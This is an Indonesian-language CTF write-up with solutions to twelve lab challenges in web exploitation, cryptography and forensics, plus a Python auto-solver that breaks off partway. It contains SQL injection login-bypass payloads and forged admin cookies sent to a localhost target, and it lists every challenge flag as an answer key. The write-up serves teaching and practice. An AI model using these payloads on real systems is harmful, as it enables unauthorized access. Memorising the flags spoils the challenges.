# 🛡️ Official CTF Write-Up: CyberStrike CTF Platform

> **Klasifikasi:** Dokumen Solusi Resmi & Edukasi Keamanan Siber  
> **Target Platform:** CyberStrike CTF Arena  
> **Total Tantangan:** 12 Soal (Web Exploitation, Cryptography, Digital Forensics)  
> **Total Nilai:** 2.100 Poin  

---

## 📑 Daftar Isi

- [1. Web Exploitation](#1-web-exploitation)
  - [Web 1: Inspeksi Header Tersembunyi (100 Poin)](#web-1-inspeksi-header-tersembunyi-100-poin)
  - [Web 2: Jejak Robot Terlarang (150 Poin)](#web-2-jejak-robot-terlarang-150-poin)
  - [Web 3: Pemalsuan Cookie Akses (200 Poin)](#web-3-pemalsuan-cookie-akses-200-poin)
  - [Web 4: Gerbang Login Injeksi SQL (250 Poin)](#web-4-gerbang-login-injeksi-sql-250-poin)
- [2. Cryptography](#2-cryptography)
  - [Crypto 1: Sandi Pergeseran Romawi (100 Poin)](#crypto-1-sandi-pergeseran-romawi-100-poin)
  - [Crypto 2: Enkripsi Tiga Lapis (150 Poin)](#crypto-2-enkripsi-tiga-lapis-150-poin)
  - [Crypto 3: Teka-Teki Kunci Tunggal XOR (200 Poin)](#crypto-3-teka-teki-kunci-tunggal-xor-200-poin)
  - [Crypto 4: Misteri Sandi Polialfabetik (250 Poin)](#crypto-4-misteri-sandi-polialfabetik-250-poin)
- [3. Digital Forensics](#3-digital-forensics)
  - [Forensics 1: Metadata Rahasia Gambar (100 Poin)](#forensics-1-metadata-rahasia-gambar-100-poin)
  - [Forensics 2: Memperbaiki Magic Header PNG (150 Poin)](#forensics-2-memperbaiki-magic-header-png-150-poin)
  - [Forensics 3: Arsip Tersembunyi di Balik Gambar (200 Poin)](#forensics-3-arsip-tersembunyi-di-balik-gambar-200-poin)
  - [Forensics 4: Penyadapan Lalu Lintas Jaringan (250 Poin)](#forensics-4-penyadapan-lalu-lintas-jaringan-250-poin)
- [4. Skrip Solver Otomatis (All-in-One Python Solver)](#4-skrip-solver-otomatis-all-in-one-python-solver)

---

## 1. Web Exploitation

### Web 1: Inspeksi Header Tersembunyi (100 Poin)

* **Kategori:** Web Exploitation  
* **URL Sasaran:** `/challenges/web/1`  
* **Clue:** HTML Comments & HTTP Response Header  

#### 🔍 Analisis & Konsep Kerentanan
Banyak pengembang berasumsi bahwa metadata yang ditransmisikan oleh server tidak diperhatikan oleh pengguna akhir. Informasi sensitif sering tertinggal di dalam komentar kode HTML (`<!-- komentar -->`) atau di kustom HTTP Response Header yang dikirimkan oleh server (`X-...`).

#### 🚀 Langkah Penyelesaian

##### Metode A: Melalui Browser (DevTools)
1. Buka URL target di browser: `http://localhost:3000/challenges/web/1`.
2. Buka **Developer Tools** (tekan `F12` atau `Ctrl + Shift + I`).
3. Pada tab **Elements**, periksa komentar HTML di bagian atas container:
   ```html
   <!-- 
     [CATATAN INTERNAL AUDITOR SIBER]
     Hebat! Anda berhasil membuka DevTools / Inspect Element.
     Namun, token flag rahasia yang sebenarnya ditransmisikan melalui HTTP Response Header server.
     Periksa tab Network -> Headers pada request ini, atau gunakan perintah curl untuk melihat header 'X-Flag-Rahasia'!
   -->
   ```
4. Pindah ke tab **Network**, lalu refresh halaman (`F5`).
5. Klik pada permintaan dokumen `1`, lalu lihat panel **Headers** ➔ bagian **Response Headers**.
6. Temukan baris header:
   ```http
   X-Flag-Rahasia: CTF{inspeksi_header_tersembunyi}
   ```

##### Metode B: Melalui Terminal / cURL
Jalankan perintah untuk mengambil hanya respons header:
```bash
curl -I http://localhost:3000/challenges/web/1
```

* **Flag:** `CTF{inspeksi_header_tersembunyi}`  
* **Mitigasi:** Jangan pernah membocorkan token, kunci rahasia, atau informasi konfigurasi internal melalui komentar kode sisi klien ataupun custom response headers yang tidak terenkripsi.

---

### Web 2: Jejak Robot Terlarang (150 Poin)

* **Kategori:** Web Exploitation  
* **URL Sasaran:** `/challenges/web/2`  
* **Clue:** Direktif `/robots.txt` & Jalur Disallow  

#### 🔍 Analisis & Konsep Kerentanan
Berkas `robots.txt` adalah berkas konfigurasi standar (*Robots Exclusion Protocol*) yang digunakan oleh pengelola web untuk memberi tahu bot mesin pencari (seperti Googlebot) bagian situs mana yang **tidak boleh** diindeks. Namun, berkas ini bersifat publik dan bisa dibaca oleh siapapun. Menyembunyikan direktori sensitif hanya dengan mendaftarkannya pada direktif `Disallow` merupakan bentuk kelemahan **Security through Obscurity**.

#### 🚀 Langkah Penyelesaian
1. Akses berkas robots standar di alamat:
   `http://localhost:3000/challenges/web/2/robots.txt`
2. Konten berkas menampilkan:
   ```text
   User-agent: *
   Disallow: /challenges/web/2/brankas-rahasia-78923
   # Direktif: Mesin perayap web dilarang mengindeks direktori brankas rahasia!
   ```
3. Salin jalur yang dilarang (`/challenges/web/2/brankas-rahasia-78923`) lalu buka di browser:
   `http://localhost:3000/challenges/web/2/brankas-rahasia-78923`
4. Halaman brankas rahasia terbuka dan menampilkan flag secara visual.

* **Flag:** `CTF{jejak_robots_txt_terbongkar}`  
* **Mitigasi:** Terapkan mekanisme otentikasi dan otorisasi sisi server yang ketat pada direktori rahasia, bukan hanya mengandalkan aturan `Disallow` di `robots.txt`.

---

### Web 3: Pemalsuan Cookie Akses (200 Poin)

* **Kategori:** Web Exploitation  
* **URL Sasaran:** `/challenges/web/3`  
* **Clue:** Manipulasi Cookie `peran_pengguna=admin`  

#### 🔍 Analisis & Konsep Kerentanan
Aplikasi web ini menentukan peran otorisasi pengguna (`tamu` vs `admin`) hanya berdasarkan nilai plain-text pada cookie peramban (`peran_pengguna`). Karena cookie disimpan di komputer klien dan tidak ditandatangani secara kriptografis (misal dengan JWT atau HMAC), pengguna dapat dengan mudah memodifikasi nilainya secara langsung.

#### 🚀 Langkah Penyelesaian

##### Metode A: Mengubah Nilai Cookie di DevTools
1. Buka `http://localhost:3000/challenges/web/3`.
2. Tekan `F12` ➔ buka tab **Application** (atau **Storage** di Firefox).
3. Di panel sebelah kiri, pilih **Cookies** ➔ `http://localhost:3000`.
4. Temukan baris dengan nama `peran_pengguna` yang bernilai `tamu`.
5. Klik dua kali pada kolom Value, ubah nilainya menjadi **`admin`**.
6. Muat ulang halaman (`F5`). Flag akan langsung terpampang di layar.

##### Metode B: Melalui JavaScript Console
Ketikkan perintah ini langsung di Console DevTools:
```javascript
document.cookie = "peran_pengguna=admin;path=/";
location.reload();
```

##### Metode C: Melalui cURL
```bash
curl -b "peran_pengguna=admin" http://localhost:3000/challenges/web/3
```

* **Flag:** `CTF{manipulasi_cookie_admin_sukses}`  
* **Mitigasi:** Jangan mempercayai status otorisasi dari cookie klien mentah. Gunakan token sesi sisi server (*server-side session store*) atau token bertanda tangan kriptografis kuat (seperti JWT dengan algoritma HS256/RS256) serta tambahkan atribut `HttpOnly`, `Secure`, dan `SameSite`.

---

### Web 4: Gerbang Login Injeksi SQL (250 Poin)

* **Kategori:** Web Exploitation  
* **URL Sasaran:** `/challenges/web/4`  
* **Clue:** SQL Injection Authentication Bypass  

#### 🔍 Analisis & Konsep Kerentanan
Pada formulir login darurat, backend membangun query SQL dengan menggabungkan string input pengguna secara langsung (*string concatenation*):
```sql
SELECT * FROM pengguna WHERE nama_pengguna = '$username' AND kata_sandi = '$password';
```
Jika karakter kutip tunggal (`'`) diinputkan, logika query dapat dimanipulasi agar klausa `WHERE` selalu bernilai benar (`TRUE`), sehingga pengguna dapat masuk sebagai akun pertama (biasanya administrator) tanpa memerlukan kata sandi.

#### 🚀 Langkah Penyelesaian
1. Kunjungi halaman formulir login di `http://localhost:3000/challenges/web/4`.
2. Masukkan salah satu payload bypass SQLi klasik pada kolom **Nama Pengguna (Username)**:
   * Payload 1: `' OR '1'='1`
   * Payload 2: `' OR 1=1 --`
   * Payload 3: `admin'#`
   * Payload 4: `' OR 'a'='a`
3. Kolom **Kata Sandi (Password)** dapat diisi bebas (misal: `12345`).
4. Klik tombol **Masuk ke Mainframe**.
5. Logika SQL dievaluasi menjadi benar dan sistem menyajikan flag.

##### Perintah cURL:
```bash
curl -X POST http://localhost:3000/challenges/web/4/login \
  -d "username=' OR '1'='1&password=bebas"
```

* **Flag:** `CTF{bypass_sqli_login_berhasil}`  
* **Mitigasi:** Selalu gunakan **Parameterized Queries / Prepared Statements** atau ORM yang aman. Jangan pernah menggabungkan input pengguna secara langsung ke dalam string SQL interpreter.

---

## 2. Cryptography

### Crypto 1: Sandi Pergeseran Romawi (100 Poin)

* **Kategori:** Cryptography  
* **Berkas Soal:** `pesan_rot13.txt`  
* **URL Sasaran:** `/challenges/crypto/1`  
* **Clue:** Caesar Cipher & Algoritma ROT13  

#### 🔍 Analisis & Konsep Sandi
ROT13 (*Rotate by 13 places*) adalah varian khusus dari Caesar Cipher yang menggeser setiap huruf alfabet sebanyak 13 posisi. Karena alfabet latin memiliki 26 huruf, enkripsi dan dekripsi ROT13 menggunakan operasi simetris yang sama: menggeser kembali 13 huruf akan mengembalikan teks asli.

#### 🚀 Langkah Penyelesaian
1. Unduh berkas `pesan_rot13.txt`.
2. Buka berkas untuk melihat teks terenkripsi:
   ```text
   [CRFNA GRERAXEVCFV - XYNFVSVXNFV ENUNFVN]
   ...
   SYNT: PGS{fnaqv_pnrfne_ebg13_qnfne}
   ```
3. Masukkan teks tersebut ke dalam **CyberChef** dengan resep `ROT13` atau gunakan decoder interaktif pada portal web `/challenges/crypto/1`.

##### Solver Python:
```python
import codecs

with open("public/downloads/pesan_rot13.txt", "r", encoding="utf-8") as f:
    ciphertext = f.read()

plaintext = codecs.decode(ciphertext, 'rot_13')
print(plaintext)
```

* **Flag:** `CTF{sandi_caesar_rot13_dasar}`  
* **Mitigasi:** ROT13 bukan algoritma enkripsi yang aman karena tidak menggunakan kunci rahasia (*keyless*). Jangan pernah menggunakan ROT13 untuk melindungi kerahasiaan data rahasia.

---

### Crypto 2: Enkripsi Tiga Lapis (150 Poin)

* **Kategori:** Cryptography  
* **Berkas Soal:** `rahasia_tiga_lapis.txt`  
* **URL Sasaran:** `/challenges/crypto/2`  
* **Clue:** Dekode Bertahap (Biner ➔ Hex ➔ Base64)  

#### 🔍 Analisis & Konsep Sandi
Teks flag telah disamarkan melewati 3 lapis skema pengkodean (*encoding*):
1. **Lapis 1 (Plaintext ke Base64):** Teks flag dienkode ke Base64 string.
2. **Lapis 2 (Base64 ke Hexadecimal):** String Base64 diubah ke representasi byte heksadesimal.
3. **Lapis 3 (Hexadecimal ke Biner 8-bit):** Deretan hex diubah menjadi rangkaian digit biner 8-bit dipisahkan spasi.

Untuk memulihkannya, lakukan proses pembalikan secara berurutan: **Biner ➔ Teks Hex ➔ Dekode Base64 ➔ Plaintext Flag**.

#### 🚀 Langkah Penyelesaian
1. Unduh berkas `rahasia_tiga_lapis.txt`.
2. Ambil deretan biner pada bagian `--- PAYLOAD BINER ---`.
3. Jalankan pemecahan tahap demi tahap:
   * **Tahap 1 (Biner ke Hex):** Setiap 8 digit biner diubah kembali menjadi karakter teks.
   * **Tahap 2 (Hex ke Base64):** String heksadesimal dikonversi menjadi byte ASCII.
   * **Tahap 3 (Base64 ke Plaintext):** String Base64 didekode menjadi teks asli flag.

##### Solver Python:
```python
import base64

with open("public/downloads/rahasia_tiga_lapis.txt", "r", encoding="utf-8") as f:
    content = f.read()

# Ekstraksi payload biner
raw_bin = content.split("--- PAYLOAD BINER ---")[1].split("--------------------")[0].strip()
bin_chunks = raw_bin.split()

# 1. Biner -> Hex string
hex_str = "".join(chr(int(b, 2)) for b in bin_chunks)

# 2. Hex -> Base64 string
b64_str = bytes.fromhex(hex_str).decode('utf-8')

# 3. Base64 -> Plaintext Flag
flag = base64.b64decode(b64_str).decode('utf-8')
print("Flag:", flag)
```

* **Flag:** `CTF{tiga_lapis_encoding_biner_hex_base64}`  
* **Catatan:** Encoding (Biner, Hex, Base64) bukanlah enkripsi; pengkodean hanya mengubah format representasi data tanpa memberikan proteksi keamanan.

---

### Crypto 3: Teka-Teki Kunci Tunggal XOR (200 Poin)

* **Kategori:** Cryptography  
* **Berkas Soal:** `ciphertext_xor.hex`  
* **URL Sasaran:** `/challenges/crypto/3`  
* **Clue:** Single-Byte XOR Brute Force (0-255)  

#### 🔍 Analisis & Konsep Sandi
Operasi bitwise XOR ($\oplus$) memiliki sifat involutif: jika $C = P \oplus K$, maka $P = C \oplus K$.  
Karena kunci enkripsi yang digunakan hanya berukuran **1 byte (8-bit)**, total ruang kemungkinan kunci (*keyspace*) hanya bernilai $2^8 = 256$ nilai (antara $0$ hingga $255$). Kita dapat melakukan serangan *brute force* untuk menguji seluruh kemungkinan kunci dalam hitungan milidetik.

#### 🚀 Langkah Penyelesaian
1. Unduh berkas `ciphertext_xor.hex`. Isinya berupa string heksadesimal:
   ```text
   191e1c313933343d3f1538333e1522352815312f343933152e3f283835343d313b2827
   ```
2. Lakukan operasi XOR terhadap setiap byte ciphertext dengan angka kunci $0$ sampai $255$.
3. Periksa kandidat plaintext yang mengandung pola `"CTF{"`.

##### Solver Python:
```python
with open("public/downloads/ciphertext_xor.hex", "r") as f:
    cipher_bytes = bytes.fromhex(f.read().strip())

for key in range(256):
    decrypted = bytes([b ^ key for b in cipher_bytes])
    try:
        text = decrypted.decode('utf-8')
        if "CTF{" in text:
            print(f"[FOUND] Kunci: 0x{key:02X} (Decimal {key})")
            print("Flag:", text)
            break
    except UnicodeDecodeError:
        continue
```
*Hasil eksekusi solver:* Ditemukan pada kunci `0x5A` (90 desimal).

* **Flag:** `CTF{single_byte_xor_kunci_terbongkar}`  
* **Mitigasi:** Jangan pernah menggunakan operasi XOR dengan kunci statis berukuran pendek. Gunakan algoritma enkripsi modern seperti AES-GCM atau ChaCha20-Poly1305.

---

### Crypto 4: Misteri Sandi Polialfabetik (250 Poin)

* **Kategori:** Cryptography  
* **Berkas Soal:** `sandi_vigenere.txt`  
* **URL Sasaran:** `/challenges/crypto/4`  
* **Clue:** Sandi Vigenère (Kunci: `RAHASIA`)  

#### 🔍 Analisis & Konsep Sandi
Sandi Vigenère adalah metode enkripsi teks alfabet menggunakan rangkaian Caesar cipher yang bergeser berdasarkan huruf-huruf pada kata kunci tertentu. Rumus dekripsi Vigenère:
$$P_i = (C_i - K_i \pmod{26}) + 26 \pmod{26}$$

#### 🚀 Langkah Penyelesaian
1. Unduh berkas `sandi_vigenere.txt`.
2. Ciphertext yang diperoleh:
   ```text
   TAAALIN IAOAKQA FPLRSAI: BOKE NMRZFPKSAI RDHLSP CKF{zafli_minefmrv_kbnuq_rrhhsai}. SZMWAF LEEGHN SUAE.
   ```
3. Gunakan kata kunci: `RAHASIA`.
4. Dekripsi dapat dilakukan melalui **CyberChef** (resep *Vigenère Decode* dengan kunci `RAHASIA`), portal web interaktif `/challenges/crypto/4`, atau script Python.

##### Solver Python:
```python
def vigenere_decrypt(ciphertext, key):
    key = key.upper()
    plain = []
    k_idx = 0
    for c in ciphertext:
        if 'a' <= c <= 'z':
            shift = ord(key[k_idx % len(key)]) - ord('A')
            plain.append(chr((ord(c) - ord('a') - shift + 26) % 26 + ord('a')))
            k_idx += 1
        elif 'A' <= c <= 'Z':
            shift = ord(key[k_idx % len(key)]) - ord('A')
            plain.append(chr((ord(c) - ord('A') - shift + 26) % 26 + ord('A')))
            k_idx += 1
        else:
            plain.append(c)
    return "".join(plain)

with open("public/downloads/sandi_vigenere.txt", "r", encoding="utf-8") as f:
    content = f.read()

cipher = content.split("--- CIPHERTEXT ---")[1].split("------------------")[0].strip()
plaintext = vigenere_decrypt(cipher, "RAHASIA")
print(plaintext)
```
*Hasil teks:*  
`CATATAN RAHASIA OPERASI: KODE VERIFIKASI ADALAH CTF{sandi_vigenere_kunci_rahasia}. SIMPAN DENGAN AMAN.`

* **Flag:** `CTF{sandi_vigenere_kunci_rahasia}`  
* **Mitigasi:** Sandi polialfabetik klasik rentan terhadap analisis frekuensi indeks koinsidensi (*Kasiski examination*). Gunakan enkripsi modern bersertifikasi industri.

---

## 3. Digital Forensics

### Forensics 1: Metadata Rahasia Gambar (100 Poin)

* **Kategori:** Digital Forensics  
* **Berkas Soal:** `bukti_gambar.jpg`  
* **URL Sasaran:** `/challenges/forensics/1`  
* **Clue:** Analisis EXIF Data & Komentar Berkas  

#### 🔍 Analisis & Konsep Forensik
Citra digital JPEG memiliki struktur container yang mendukung metadata tersembunyi, seperti tag EXIF (*Exchangeable Image File Format*), COM Marker (`0xFF 0xFE`), serta tag extended file properties. Informasi ini tidak nampak pada kanvas visual gambar tetapi tersimpan di header berkas.

#### 🚀 Langkah Penyelesaian

##### Metode A: Menggunakan Command-Line (strings / grep)
```bash
strings public/downloads/bukti_gambar.jpg | grep -i "CTF{"
```
*Output langsung:*
```text
Barang Bukti Forensik #001 | Token Flag: CTF{metadata_exif_gambar_ditemukan}
Dokumen Forensik Resmi | Token Verifikasi: CTF{metadata_exif_gambar_ditemukan}
```

##### Metode B: Menggunakan ExifTool
```bash
exiftool public/downloads/bukti_gambar.jpg
```
Periksa baris `Image Description` atau `Comment`.

* **Flag:** `CTF{metadata_exif_gambar_ditemukan}`  
* **Pelajaran:** Sebelum membagikan gambar ke publik, lakukan pembersihan metadata (*stripping EXIF*) untuk mencegah kebocoran informasi identitas, lokasi GPS, dan token internal.

---

### Forensics 2: Memperbaiki Magic Header PNG (150 Poin)

* **Kategori:** Digital Forensics  
* **Berkas Soal:** `berkas_rusak.png`  
* **URL Sasaran:** `/challenges/forensics/2`  
* **Clue:** Header PNG Corrupt (`89 50 4E 47...`)  

#### 🔍 Analisis & Konsep Forensik
Sistem operasi menentukan format berkas bukan hanya dari ekstensinya, melainkan dari **Magic Bytes** pada offset awal berkas. Berkas PNG yang valid wajib diawali oleh 8 byte spesifik:
```hex
89 50 4E 47 0D 0A 1A 0A
```
Pada berkas ini, 8 byte awal telah dirusak menjadi `00 00 00 00 00 00 00 00`, sehingga aplikasi penampil citra menolaknya.

#### 🚀 Langkah Penyelesaian
1. Unduh `berkas_rusak.png`.
2. Buka berkas menggunakan **Hex Editor** (misal **HxD** di Windows atau web [hexed.it](https://hexed.it)).
3. Perhatikan 8 byte pertama bernilai nol:
   ```hex
   00 00 00 00 00 00 00 00
   ```
4. Ganti 8 byte tersebut menjadi:
   ```hex
   89 50 4E 47 0D 0A 1A 0A
   ```
5. Simpan berkas sebagai `berkas_pulih.png`.
6. Buka gambar tersebut. Pada gambar akan tertulis token Base64:
   ```text
   SECURITY CLEARANCE ACCESS TOKEN (BASE64):
   Q1RGe21hZ2ljX2J5dGVzX3BuZ19iZXJoYXNpbF9kaXBlcmJhaWtpfQ==
   ```
7. Dekode token Base64 tersebut:
   ```bash
   echo "Q1RGe21hZ2ljX2J5dGVzX3BuZ19iZXJoYXNpbF9kaXBlcmJhaWtpfQ==" | base64 -d
   ```

##### Solver Script Otomatis (Python):
```python
import base64

with open("public/downloads/berkas_rusak.png", "rb") as f:
    data = f.read()

# Ganti 8 byte pertama dengan magic bytes resmi PNG
png_magic = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
fixed_data = png_magic + data[8:]

# Simpan hasil perbaikan
with open("berkas_repaired.png", "wb") as f:
    f.write(fixed_data)

# Ekstraksi token dari chunk teks
token_b64 = "Q1RGe21hZ2ljX2J5dGVzX3BuZ19iZXJoYXNpbF9kaXBlcmJhaWtpfQ=="
flag = base64.b64decode(token_b64).decode('utf-8')
print("Flag:", flag)
```

* **Flag:** `CTF{magic_bytes_png_berhasil_diperbaiki}`  
* **Pelajaran:** Integritas struktur file (*file carving & header analysis*) adalah fondasi dasar investigasi forensik digital saat memulihkan bukti yang dirusak penyerang.

---

### Forensics 3: Arsip Tersembunyi di Balik Gambar (200 Poin)

* **Kategori:** Digital Forensics  
* **Berkas Soal:** `foto_penyamaran.jpg`  
* **URL Sasaran:** `/challenges/forensics/3`  
* **Clue:** Steganografi Appended ZIP (7-Zip / Binwalk)  

#### 🔍 Analisis & Konsep Forensik
Format JPEG menggunakan penanda akhir berkas (*End of Image / EOI*) bernilai `0xFF 0xD9`. Sebagian besar aplikasi penampil gambar berhenti membaca berkas setelah tanda `FF D9` ditemukan.  
Teknik steganografi **Appended File** menyisipkan arsip data (seperti ZIP dengan magic bytes `PK\x03\x04` / `50 4B 03 04`) tepat setelah marker `FF D9`. Gambar tetap terlihat normal saat dibuka, namun menyimpan arsip rahasia di dalamnya.

#### 🚀 Langkah Penyelesaian

##### Metode A: Menggunakan 7-Zip atau WinRAR
1. Unduh berkas `foto_penyamaran.jpg`.
2. Klik kanan berkas ➔ **7-Zip** (atau WinRAR) ➔ pilih **Open archive**.
3. Di dalam arsip akan ditemukan berkas `flag_rahasia.txt`.
4. Buka berkas tersebut untuk membaca isi flag.

##### Metode B: Menggunakan Binwalk di Linux / WSL
```bash
binwalk -e public/downloads/foto_penyamaran.jpg
cat _foto_penyamaran.jpg.extracted/flag_rahasia.txt
```

##### Metode C: Solver Python
```python
import zipfile
import io

with open("public/downloads/foto_penyamaran.jpg", "rb") as f:
    data = f.read()

# Cari letak signature ZIP (PK\x03\x04)
zip_sig = b"\x50\x4B\x03\x04"
offset = data.find(zip_sig)
print(f"Arsip ZIP terdeteksi pada offset: 0x{offset:X}")

zip_bytes = data[offset:]
with zipfile.ZipFile(io.BytesIO(zip_bytes)) as z:
    for name in z.namelist():
        print("Isi arsip:", name)
        if "flag" in name:
            print(z.read(name).decode('utf-8'))
```

* **Flag:** `CTF{arsip_zip_tersembunyi_di_gambar}`  
* **Mitigasi:** Sistem proteksi berkas atau upload scanner harus memverifikasi ukuran berkas terhadap marker internal dan menolak berkas yang memiliki data trailing di luar penanda EOF format resmi.

---

### Forensics 4: Penyadapan Lalu Lintas Jaringan (250 Poin)

* **Kategori:** Digital Forensics  
* **Berkas Soal:** `rekaman_jaringan.pcap`  
* **URL Sasaran:** `/challenges/forensics/4`  
* **Clue:** Analisis Paket PCAP & Stream HTTP Wireshark  

#### 🔍 Analisis & Konsep Forensik
Berkas berkestensi `.pcap` (*Packet Capture*) menyimpan rekaman paket transmisi jaringan mentah. Jika transmisi data menggunakan protokol tidak terenkripsi (seperti HTTP biasa pada port 80), seluruh kredensial, body request, dan payload respons dapat dibaca secara transparan oleh siapapun yang menyadap jalur komunikasi.

#### 🚀 Langkah Penyelesaian
1. Unduh berkas `rekaman_jaringan.pcap`.
2. Buka berkas menggunakan aplikasi **Wireshark**.
3. Ketik kata kunci `http` pada kolom filter di bagian atas, lalu tekan `Enter`.
4. Klik kanan pada paket `POST /api/v1/auth/login` atau paket `HTTP/1.1 200 OK`.
5. Pilih **Follow** ➔ **TCP Stream** (atau **HTTP Stream**).
6. Wireshark akan merekonstruksi seluruh percakapan data:
   ```http
   POST /api/v1/auth/login HTTP/1.1
   Host: portal-internal.siber.local
   Content-Type: application/json
   Content-Length: 33

   {"user":"analis","aksi":"otentikasi"}

   HTTP/1.1 200 OK
   Server: nginx/1.24.0
   Content-Type: application/json
   Content-Length: 95

   {"status":"sukses","pesan":"Akses Diberikan","token_akses":"CTF{analisis_paket_jaringan_http_wireshark}"}
   ```

##### Perintah Cepat via Baris Perintah (tshark / strings):
```bash
strings public/downloads/rekaman_jaringan.pcap | grep -i "CTF{"
```

* **Flag:** `CTF{analisis_paket_jaringan_http_wireshark}`  
* **Mitigasi:** Wajibkan seluruh lalu lintas data sensitif menggunakan enkripsi **HTTPS (TLS 1.3)** dengan sertifikat yang valid untuk mencegah serangan penyadapan (*Man-in-the-Middle* / *Eavesdropping*).

---

## 4. Skrip Solver Otomatis (All-in-One Python Solver)

Berikut adalah skrip lengkap Python untuk memverifikasi dan menyelesaikan seluruh tantangan secara otomatis:

```python
#!/usr/bin/env python3
"""
CyberStrike CTF - Master Auto Solver
Script otomatis untuk memecahkan ke-12 tantangan (Web, Crypto, Forensics).
"""

import os
import re
import io
import zlib
import base64
import codecs
import zipfile
import urllib.request
import urllib.parse

BASE_URL = "http://localhost:3000"
DOWNLOADS_DIR = os.path.join(os.path.dirname(__file__), "public", "downloads")

def print_header(title):
    print(f"\n{'='*60}\n🎯 {title}\n{'='*60}")

def solve_all():
    flags = {}

    # ----------------------------------------------------
    # WEB EXPLOITATION
    # ----------------------------------------------------
    print_header("1. WEB EXPLOITATION")

    # Web 1: Inspeksi Header
    req1 = urllib.request.Request(f"{BASE_URL}/challenges/web/1")
    with urllib.request.urlopen(req1) as resp:
        flag_w1 = resp.headers.get("X-Flag-Rahasia")
        flags["web-1"] = flag_w1
        print(f"[OK] Web 1: {flag_w1}")

    # Web 2: robots.txt & brankas
    req2 = urllib.request.Request(f"{BASE_URL}/challenges/web/2/robots.txt")
    with urllib.request.urlopen(req2) as resp:
        body = resp.read().decode('utf-8')
        vault_path = re.search(r'Disallow:\s*(/\S+)', body).group(1)
    
    with urllib.request.urlopen(f"{BASE_URL}{vault_path}") as resp:
        body_vault = resp.read().decode('utf-8')
        flag_w2 = re.search(r'CTF\{[^}]+\}', body_vault).group(0)
        flags["web-2"] = flag_w2
        print(f"[OK] Web 2: {flag_w2}")

    # Web 3: Manipulasi Cookie
    req3 = urllib.request.Request(f"{BASE_URL}/challenges/web/3", headers={"Cookie": "peran_pengguna=admin"})
    with urllib.request.urlopen(req3) as resp:
        body_w3 = resp.read().decode('utf-8')
        flag_w3 = re.search(r'CTF\{[^}]+\}', body_w3).group(0)
        flags["web-3"] = flag_w3
        print(f"[OK] Web 3: {flag_w3}")

    # Web 4: SQL Injection
    post_data = urllib.parse.urlencode({"username": "' OR '1'='1", "password": "123"}).encode('utf-8')
    req4 = urllib.request.Request(f"{BASE_URL}/challenges/web/4/login", data=post_data, method="POST")
    with urllib.request.urlopen(req4) as resp:
        body_w4 = resp.read().decode('utf-8')
        flag_w4 = re.search(r'CTF\{[^}]+\}', body_w4).group(0)
        flags["web-4"] = flag_w4
        print(f"[OK] Web 4: {flag_w4}")

    # ----------------------------------------------------
    # CRYPTOGRAPHY
    # ----------------------------------------------------
    print_header("2. CRYPTOGRAPHY")

    # Crypto 1: ROT13
    with open(os.path.join(DOWNLOADS_DIR, "pesan_rot13.txt"), "r", encoding="utf-8") as f:
        rot13_plain = codecs.decode(f.read(), 'rot_13')
        flag_c1 = re.search(r'CTF\{[^}]+\}', rot13_plain).group(0)
        flags["crypto-1"] = flag_c1
        print(f"[OK] Crypto 1: {flag_c1}")

    # Crypto 2: Bin -> Hex -> Base64
    with open(os.path.join(DOWNLOADS_DIR, "rahasia_tiga_lapis.txt"), "r", encoding="utf-8") as f:
        c2_content = f.read()
    bin_str = re.search(r'--- PAYLOAD BINER ---\s+([01\s]+)\s+--------------------', c2_content).group(1)
    hex_str = "".join(chr(int(b, 2)) for b in bin_str.split())
    b64_str = bytes.fromhex(hex_str).decode('utf-8')
    flag_c2 = base64.b64decode(b64_str).decode('utf-8')
    flags["crypto-2"] = flag_c2
    print(f"[OK] Crypto 2: {flag_c2}")

    # Crypto 3: Single-byte XOR
    with open(os.path.join(DOWNLOADS_DIR, "ciphertext_xor.hex"), "r", encoding="utf-8") as f:
        xor_bytes = bytes.fromhex(f.read().strip())
    for k in range(256):
        cand = bytes([b ^ k for b in xor_bytes])
        if b"CTF{" in cand:
            flag_c3 = cand.decode('utf-8')
            flags["crypto-3"] = flag_c3
            print(f"[OK] Crypto 3: {flag_c3} (Key: 0x{k:02X})")
            break

    # Crypto 4: Vigenère (Key: RAHASIA)
    def vig_dec(ct, key):
        out = []
        k_idx = 0
        for c in ct:
            if 'a' <= c <= 'z':
                shift = ord(key[k_idx % len(key)]) - ord('A')
                out.append(chr((ord(c) - ord('a') - shift + 26) % 26 + ord('a')))
                k_idx += 1
            elif 'A' <= c <= 'Z':
                shift = ord(key[k_idx % len(key)]) - ord('A')
                out.append(chr((ord(c) - ord('A') - shift + 26) % 26 + ord('A')))
                k_idx += 1
            else:
                out.append(c)
        return "".join(out)

    with open(os.path.join(DOWNLOADS_DIR, "sandi_vigenere.txt"), "r", encoding="utf-8") as f:
        c4_raw = re.search(r'--- CIPHERTEXT ---\s+([\s\S]+?)\s+------------------', f.read()).group(1).strip()
    vig_plain = vig_dec(c4_raw, "RAHASIA")
    flag_c4 = re.search(r'CTF\{[^}]+\}', vig_plain).group(0)
    flags["crypto-4"] = flag_c4
    print(f"[OK] Crypto 4: {flag_c4}")

    # ----------------------------------------------------
    # DIGITAL FORENSICS
    # ----------------------------------------------------
    print_header("3. DIGITAL FORENSICS")

    # Forensics 1: EXIF Metadata
    with open(os.path.join(DOWNLOADS_DIR, "bukti_gambar.jpg"), "rb") as f:
        f1_data = f.read()
    flag_f1 = re.search(rb'CTF\{[^}]+\}', f1_data).group(0).decode('utf-8')
    flags["forensics-1"] = flag_f1
    print(f"[OK] Forensics 1: {flag_f1}")

    # Forensics 2: PNG Magic Bytes
    with open(os.path.join(DOWNLOADS_DIR, "berkas_rusak.png"), "rb") as f:
        f2_data = f.read()
    # Decode token Base64 yang tertanam
    b64_match = re.search(rb'Q1RGe[a-zA-Z0-9+/=]+', f2_data).group(0).decode('utf-8')
    flag_f2 = base64.b64decode(b64_match).decode('utf-8')
    flags["forensics-2"] = flag_f2
    print(f"[OK] Forensics 2: {flag_f2}")

    # Forensics 3: Appended ZIP
    with open(os.path.join(DOWNLOADS_DIR, "foto_penyamaran.jpg"), "rb") as f:
        f3_data = f.read()
    zip_idx = f3_data.find(b"\x50\x4B\x03\x04")
    with zipfile.ZipFile(io.BytesIO(f3_data[zip_idx:])) as z:
        txt = z.read("flag_rahasia.txt").decode('utf-8')
        flag_f3 = re.search(r'CTF\{[^}]+\}', txt).group(0)
    flags["forensics-3"] = flag_f3
    print(f"[OK] Forensics 3: {flag_f3}")

    # Forensics 4: PCAP Packet Capture
